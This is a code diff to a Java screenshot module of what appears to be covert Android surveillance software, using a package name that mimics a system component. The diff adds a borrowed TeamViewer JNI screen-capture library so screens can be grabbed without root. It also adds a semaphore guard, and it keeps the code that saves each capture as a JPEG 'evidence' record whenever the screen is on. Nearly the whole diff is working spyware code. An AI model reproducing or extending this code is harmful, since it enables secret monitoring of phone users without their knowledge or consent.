@@ -13,6 +13,7 @@ import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.IOException;
 import java.nio.ByteBuffer;
+import java.util.concurrent.Semaphore;
 
 import android.content.Context;
 import android.graphics.Bitmap;
@@ -31,9 +32,11 @@ import com.android.networking.evidence.EvidenceType;
 import com.android.networking.evidence.EvidenceReference;
 import com.android.networking.file.AutoFile;
 import com.android.networking.listener.ListenerStandby;
+
 import com.android.networking.util.Check;
 import com.android.networking.util.DataBuffer;
 import com.android.networking.util.WChar;
+import com.teamviewer.teamviewerlib.ScreenCap.JNICaptureScreenWrapper;
 
 /**
  * The Class SnapshotAgent.
@@ -60,15 +63,19 @@ public class ModuleSnapshot extends BaseInstantModule {
 	/** The type. */
 	private int type;
 	private int quality;
-	private boolean working;
+	Semaphore working = new Semaphore(1, true);
+	JNICaptureScreenWrapper jni;
 
 	/**
 	 * Instantiates a new snapshot agent.
 	 */
 	public ModuleSnapshot() {
+		jni = new JNICaptureScreenWrapper(this);
+
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " SnapshotAgent constructor");//$NON-NLS-1$
+			Check.log(TAG + " SnapshotAgent constructor, jni:" + jni);//$NON-NLS-1$
 		}
+
 	}
 
 	/*
@@ -78,6 +85,11 @@ public class ModuleSnapshot extends BaseInstantModule {
 	 */
 	@Override
 	public boolean parse(ConfModule conf) {
+
+		if (jni == null && !Status.self().haveRoot()) {
+			return false;
+		}
+
 		try {
 			String qualityParam = conf.getString("quality");
 			if ("low".equals(qualityParam)) {
@@ -107,60 +119,64 @@ public class ModuleSnapshot extends BaseInstantModule {
 	 */
 	@Override
 	public void actualStart() {
-		try {
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (actualStart)");
+		}
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (actualStart): have root");
+		}
+
+		final boolean isScreenOn = ListenerStandby.isScreenOn();
+
+		if (!isScreenOn) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (actualStart)");
+				Check.log(TAG + " (go): Screen powered off, no snapshot");//$NON-NLS-1$
 			}
-			if (Status.self().haveRoot()) {
 
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (actualStart): have root");
-				}
+			return;
+		}
+		if (!working.tryAcquire()) {
+			return;
+		}
 
-				final boolean isScreenOn = ListenerStandby.isScreenOn();
+		try {
+			final Display display = ((WindowManager) Status.getAppContext().getSystemService(Context.WINDOW_SERVICE))
+					.getDefaultDisplay();
 
-				if (!isScreenOn) {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (go): Screen powered off, no snapshot");//$NON-NLS-1$
-					}
+			int width, height, w, h;
+			final int orientation = display.getOrientation();
 
-					return;
-				}
-				synchronized (this) {
-					if (working) {
-						return;
-					}
-					working = true;
-				}
+			if (isTablet()) {
+				h = display.getWidth();
+				w = display.getHeight();
+			} else {
+				w = display.getWidth();
+				h = display.getHeight();
+			}
 
-				final Display display = ((WindowManager) Status.getAppContext()
-						.getSystemService(Context.WINDOW_SERVICE)).getDefaultDisplay();
+			boolean useOrientation = true;
+			boolean useMatrix = true;
 
-				int width, height, w, h;
-				final int orientation = display.getOrientation();
+			if (!useOrientation || orientation == Surface.ROTATION_0 || orientation == Surface.ROTATION_180) {
+				width = w;
+				height = h;
+			} else {
+				height = w;
+				width = h;
+			}
 
-				if (isTablet()) {
-					h = display.getWidth();
-					w = display.getHeight();
-				} else {
-					w = display.getWidth();
-					h = display.getHeight();
-				}
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (go): w=" + width + " h=" + height);//$NON-NLS-1$ //$NON-NLS-2$
+			}
 
-				boolean useOrientation = true;
-				boolean useMatrix = true;
+			Bitmap bitmap;
+			if (jni != null) {
 
-				if (!useOrientation || orientation == Surface.ROTATION_0 || orientation == Surface.ROTATION_180) {
-					width = w;
-					height = h;
-				} else {
-					height = w;
-					width = h;
-				}
-
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (go): w=" + width + " h=" + height);//$NON-NLS-1$ //$NON-NLS-2$
-				}
+				jni.init();
+				bitmap = jni.getBitmap();
+			} else {
 
 				// 0: invertito blu e rosso
 				// 1: perdita info
@@ -208,50 +224,44 @@ public class ModuleSnapshot extends BaseInstantModule {
 				}
 
 				if (raw != null) {
-					Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
+					bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
+				} else {
+					return;
+				}
+				ByteBuffer buffer = ByteBuffer.wrap(raw);
+				bitmap.copyPixelsFromBuffer(buffer);
+				buffer = null;
+				raw = null;
 
-					ByteBuffer buffer = ByteBuffer.wrap(raw);
-					bitmap.copyPixelsFromBuffer(buffer);
-					buffer = null;
-					raw = null;
+				int rotateTab = 0;
 
-					int rotateTab = 0;
+				if (isTablet()) {
+					rotateTab = -90;
+				}
 
-					if (isTablet()) {
-						rotateTab = -90;
+				if (useMatrix && orientation != Surface.ROTATION_0) {
+					final Matrix matrix = new Matrix();
+
+					if (orientation == Surface.ROTATION_90) {
+						matrix.setRotate(270 + rotateTab);
+					} else if (orientation == Surface.ROTATION_270) {
+						matrix.setRotate(90 + rotateTab);
+					} else if (orientation == Surface.ROTATION_180) {
+						matrix.setRotate(180 + rotateTab);
+					} else {
+						matrix.setRotate(rotateTab);
 					}
 
-					if (useMatrix && orientation != Surface.ROTATION_0) {
-						final Matrix matrix = new Matrix();
-
-						if (orientation == Surface.ROTATION_90) {
-							matrix.setRotate(270 + rotateTab);
-						} else if (orientation == Surface.ROTATION_270) {
-							matrix.setRotate(90 + rotateTab);
-						} else if (orientation == Surface.ROTATION_180) {
-							matrix.setRotate(180 + rotateTab);
-						} else {
-							matrix.setRotate(rotateTab);
-						}
-
-						bitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height, matrix, true);
-					}
-
-					byte[] jpeg = toJpeg(bitmap);
-					bitmap = null;
-
-					EvidenceReference.atomic(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
-					jpeg = null;
+					bitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height, matrix, true);
 				}
-				
-				synchronized(this){
-					working=false;
-				}
-			}else{
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (actualStart): no root");
-				}
+
+				byte[] jpeg = toJpeg(bitmap);
+				bitmap = null;
+
+				EvidenceReference.atomic(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
+				jpeg = null;
 			}
+
 		} catch (final Exception ex) {
 			if (Cfg.EXCEPTION) {
 				Check.log(ex);
@@ -261,6 +271,8 @@ public class ModuleSnapshot extends BaseInstantModule {
 				Check.log(TAG + " (go) Error: " + ex);//$NON-NLS-1$
 				Check.log(ex);//$NON-NLS-1$
 			}
+		} finally {
+			working.release();
 		}
 
 	}
@@ -361,7 +373,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getRawBitmap): finished calling frame generator");
 			}
-			//11_3=frame
+			// 11_3=frame
 			final AutoFile file = new AutoFile(path, Messages.getString("11_3")); //$NON-NLS-1$
 
 			if (file.exists()) {
